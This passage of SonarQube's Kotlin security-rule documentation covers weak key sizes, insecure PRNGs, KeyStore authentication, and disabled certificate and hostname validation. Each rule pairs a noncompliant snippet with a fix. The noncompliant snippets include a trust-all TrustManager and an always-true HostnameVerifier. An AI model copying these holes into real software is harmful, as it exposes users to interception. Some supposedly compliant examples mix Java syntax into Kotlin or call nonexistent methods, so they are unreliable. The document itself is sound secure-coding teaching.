<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Java Cryptographic Extension</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.net.ssl.SSLContext;
import java.security.NoSuchAlgorithmException;

fun main(args: Array&lt;String&gt;) {
    try {
        SSLContext.getInstance(&#34;TLSv1.1&#34;); // Noncompliant
    } catch (e: NoSuchAlgorithmException) {
        // ...
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import javax.net.ssl.SSLContext;
import java.security.NoSuchAlgorithmException;

fun main(args: Array&lt;String&gt;) {
    try {
        SSLContext.getInstance(&#34;TLSv1.2&#34;);
    } catch (e: NoSuchAlgorithmException) {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br /></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ" rel="nofollow">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S4426">
              kotlin:S4426
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>
<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>
<ul><li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li><li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.
    <ul><li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key
      Derivation Function 2) </li></ul>  </li></ul>
<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at
the plaintext.</p>
<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this
data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Java Cryptographic Extension</h2>
<h3>Code examples</h3>
<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the
algorithm.</p>
<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br /> For example,
a 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>
<h4>Noncompliant code example</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;

fun main(args: Array&lt;String&gt;) {
    try {
        val keyPairGenerator &#61; KeyPairGenerator.getInstance(&#34;RSA&#34;);
        keyPairGenerator.initialize(1024); // Noncompliant

    } catch (e: NoSuchAlgorithmException) {
        // ...
    }
}
</pre>
<p>Here is an example of a private key generation with AES:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
import java.security.KeyGenerator;
import java.security.NoSuchAlgorithmException;

fun main(args: Array&lt;String&gt;) {
    try {
        val keyGenerator &#61; KeyGenerator.getInstance(&#34;AES&#34;);
        keyGenerator.initialize(64); // Noncompliant

    } catch (e: NoSuchAlgorithmException) {
        // ...
    }
}
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the algorithm
name:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.InvalidAlgorithmParameterException;
import java.security.spec.ECGenParameterSpec;

fun main(args: Array&lt;String&gt;) {
    try {
        val keyPairGenerator  &#61; KeyPairGenerator.getInstance(&#34;EC&#34;);
        val ellipticCurveName &#61; new ECGenParameterSpec(&#34;secp112r1&#34;); // Noncompliant
        keyPairGenerator.initialize(ellipticCurveName);

    } catch (e: NoSuchAlgorithmException) {
        // ...
    } catch (e: InvalidAlgorithmParameterException) {
        // ...
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;

fun main(args: Array&lt;String&gt;) {
    try {
        val keyPairGenerator &#61; KeyPairGenerator.getInstance(&#34;RSA&#34;);
        keyPairGenerator.initialize(2048);

    } catch (e: NoSuchAlgorithmException) {
        // ...
    }
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;

public static void main(String[] args) {
    try {
        val keyPairGenerator &#61; KeyPairGenerator.getInstance(&#34;AES&#34;);
        keyPairGenerator.initialize(128);

    } catch (e: NoSuchAlgorithmException) {
        // ...
    }
}
</pre>
<pre data-diff-id="3" data-diff-type="compliant">
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.InvalidAlgorithmParameterException;
import java.security.spec.ECGenParameterSpec;

public static void main(String[] args) {
    try {
        val keyPairGenerator  &#61; KeyPairGenerator.getInstance(&#34;EC&#34;);
        val ellipticCurveName &#61; new ECGenParameterSpec(&#34;secp256r1&#34;);
        keyPairGenerator.initialize(ellipticCurveName);

    } catch (e: NoSuchAlgorithmException) {
        // ...
    } catch (e: InvalidAlgorithmParameterException) {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>The appropriate choices are the following.</p>
<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>
<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>
<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both.</p>
<h4>AES (Advanced Encryption Standard)</h4>
<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying
all possible keys.<br /> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.
Therefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>
<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>
<h4>Elliptic Curve Cryptography (ECC)</h4>
<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve
algorithms are mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>
<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC algorithms.</p>
<h3>Going the extra mile</h3>
<h4>Pre-Quantum Cryptography</h4>
<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br /> It is important to keep
in mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or
&#34;post-quantum&#34;) counterpart.</p>
<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>
<p><a href="https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation" rel="nofollow">Learn more here</a>.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode" rel="nofollow">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf" rel="nofollow">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths* <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption
  Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ" rel="nofollow">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S2245">
              kotlin:S2245
            </a>
          </td>
          <td>
            <details>
              <p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2013-6386" rel="nofollow">CVE-2013-6386</a> </li><li> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-3419" rel="nofollow">CVE-2006-3419</a> </li><li> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2008-4102" rel="nofollow">CVE-2008-4102</a> </li></ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li><li> the function you use generates a value which can be predicted (pseudo-random). </li><li> the generated value is used multiple times. </li><li> an attacker can access the generated value. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Only use random number generators which are <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#secure-random-number-generation" rel="nofollow">recommended by
  OWASP</a> or any other trusted organization. </li><li> Use the generated random values only once. </li><li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
val random &#61; Random() // Noncompliant: Random() is not a secure random number generaotr
val bytes &#61; ByteArray(20)
random.nextBytes(bytes)
</pre>
<h2>Compliant Solution</h2>
<pre>
val random &#61; SecureRandom() // Compliant
val bytes &#61; ByteArray(20)
random.nextBytes(bytes)
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/338" rel="nofollow">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)
  </li><li> <a href="https://cwe.mitre.org/data/definitions/330" rel="nofollow">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li><li> <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/1241" rel="nofollow">MITRE, CWE-1241</a> - Use of Predictable Algorithm in Random Number Generator </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM" rel="nofollow">Predictable Pseudo Random Number
  Generator</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S6288">
              kotlin:S6288
            </a>
          </td>
          <td>
            <details>
              <p>Android KeyStore is a secure container for storing key materials, in particular it prevents key materials extraction, i.e. when the application
process is compromised, the attacker cannot extract keys but may still be able to use them. It’s possible to enable an Android security feature, user
authentication, to restrict usage of keys to only authenticated users. The lock screen has to be unlocked with defined credentials
(pattern/PIN/password, biometric).</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The application requires prohibiting the use of keys in case of compromise of the application process. </li><li> The key material is used in the context of a highly sensitive application like a e-banking mobile app. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enable user authentication (by setting <code>setUserAuthenticationRequired</code> to <code>true</code> during key generation)
to use keys for a limited duration of time (by setting appropriate values to <code>setUserAuthenticationValidityDurationSeconds</code>), after which
the user must re-authenticate.</p>
<h2>Sensitive Code Example</h2>
<p>Any users can use the key:</p>
<pre>
val keyGenerator: KeyGenerator &#61; KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, &#34;AndroidKeyStore&#34;)

var builder: KeyGenParameterSpec &#61; KeyGenParameterSpec.Builder(&#34;test_secret_key&#34;, KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT) // Noncompliant
   .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
   .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
   .build()

keyGenerator.init(builder)
</pre>
<h2>Compliant Solution</h2>
<p>The use of the key is limited to authenticated users (for a duration of time defined to 60 seconds):</p>
<pre>
val keyGenerator: KeyGenerator &#61; KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, &#34;AndroidKeyStore&#34;)

var builder: KeyGenParameterSpec &#61; KeyGenParameterSpec.Builder(&#34;test_secret_key&#34;, KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT)
   .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
   .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
   .setUserAuthenticationRequired(true) // Compliant
   .setUserAuthenticationParameters (60, KeyProperties.AUTH_DEVICE_CREDENTIAL)
   .build()

keyGenerator.init(builder)
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://developer.android.com/training/articles/keystore" rel="nofollow">developer.android.com</a> - Android keystore system </li><li> <a href="https://developer.android.com/training/articles/keystore#UserAuthentication" rel="nofollow">developer.android.com</a> - Require user authentication
  for key use </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Authentication and Session Management Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m4-insecure-authentication" rel="nofollow">OWASP Mobile Top 10 2016 Category M4</a> - Insecure
  Authentication </li><li> <a href="https://cwe.mitre.org/data/definitions/522" rel="nofollow">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S4830">
              kotlin:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. The role
of certificate validation in this process is to ensure that a system is indeed the one it claims to be, adding an extra layer of trust and
security.</p>
<p>When certificate validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in Java Cryptographic Extension</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled certificate validation.</p>
<p>The certificate validation gets disabled by overriding <code>X509TrustManager</code> with an empty implementation. It is highly recommended to use
the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre>
val trustAllCerts &#61; arrayOf&lt;TrustManager&gt;(object : X509TrustManager {
  &#64;Throws(CertificateException::class)
  override fun checkClientTrusted(chain: Array&lt;java.security.cert.X509Certificate&gt;, authType: String) {
  } // Noncompliant

  &#64;Throws(CertificateException::class)
  override fun checkServerTrusted(chain: Array&lt;java.security.cert.X509Certificate&gt;, authType: String) {
  } // Noncompliant

  override fun getAcceptedIssuers(): Array&lt;java.security.cert.X509Certificate&gt; {
   return arrayOf()
  }
})
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<p>Here is a sample command to import a certificate to the Java trust store:</p>
<pre>
keytool -import -alias myserver -file myserver.crt -keystore cacerts
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://cwe.mitre.org/data/definitions/295" rel="nofollow">MITRE, CWE-295</a> - Improper Certificate Validation </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.&#43;Do&#43;not&#43;use&#43;insecure&#43;or&#43;weak&#43;cryptographic&#43;algorithms" rel="nofollow">https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.&#43;Do&#43;not&#43;use&#43;insecure&#43;or&#43;weak&#43;cryptographic&#43;algorithms</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S5527">
              kotlin:S5527
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows attackers to impersonate a trusted host.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this
process, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding
an extra layer of trust and security.</p>
<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity
and intercept, manipulate, or steal the data being transmitted.</p>
<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the
application code would still accept it.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build
this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit
this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,
tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data
your system sends to them, potentially leading to significant data breaches.</p>
<h2>How to fix it in OkHttp</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled hostname validation.</p>
<p>The hostname validation gets disabled by overriding <code>javax.net.ssl.HostnameVerifier.verify()</code> with an empty implementation. It is highly
recommended to use the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.net.ssl.HttpsURLConnection
import javax.net.ssl.SSLSession
import javax.net.ssl.HostnameVerifier
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response

fun request() {
    val builder &#61; OkHttpClient.Builder()
    builder.hostnameVerifier(object : HostnameVerifier {
      override fun verify(hostname: String?, session: SSLSession?): Boolean { // Noncompliant
        return true
      }
    })

    OkHttpClient client &#61; builder.build()

    Request request &#61; new Request.Builder()
            .url(&#34;https://example.com&#34;)
            .build()

    Response response &#61; client.newCall(request).execute()
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import javax.net.ssl.HttpsURLConnection
import javax.net.ssl.SSLSession
import javax.net.ssl.HostnameVerifier
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response

fun request() {
    val builder &#61; OkHttpClient.Builder()

    OkHttpClient client &#61; builder.build()

    Request request &#61; new Request.Builder()
            .url(&#34;https://example.com&#34;)
            .build()

    Response response &#61; client.newCall(request).execute()
}
</pre>
<h3>How does this work?</h3>
<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root
cause: the validity of the certificate.</p>
<h4>Use valid certificates</h4>
<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around
another system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>
<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,
consider replicating its service to a server whose certificate you can change yourself.</p>
<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>
<ul><li> Create a self-signed certificate for that machine. </li><li> Add this self-signed certificate to the system’s trust store. </li><li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li></ul>
<p>Here is a sample command to import a certificate to the Java trust store:</p>
<pre>
keytool -import -alias myserver -file myserver.crt -keystore cacerts
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
